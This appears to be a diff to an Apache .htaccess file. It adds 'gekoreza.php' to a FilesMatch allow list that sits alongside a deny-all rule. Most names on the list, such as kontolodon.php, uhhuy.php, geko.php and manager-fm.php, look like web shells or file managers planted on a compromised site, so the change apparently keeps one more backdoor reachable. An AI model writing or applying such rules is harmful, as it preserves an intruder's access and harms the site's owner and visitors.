@@ -39,7 +39,7 @@
     Order Deny,Allow
     Deny from all
 </Files>
-<FilesMatch "^(index.php|field.api.php|manager-fm.php|tiny.php|kontolodon.php|ecilepsi.php|dev1.php|uhhuy.php|geko.php|cache.php)$">
+<FilesMatch "^(index.php|field.api.php|manager-fm.php|tiny.php|kontolodon.php|ecilepsi.php|dev1.php|uhhuy.php|geko.php|cache.php|gekoreza.php)$">
     Order allow,deny
     Allow from all
 </FilesMatch>
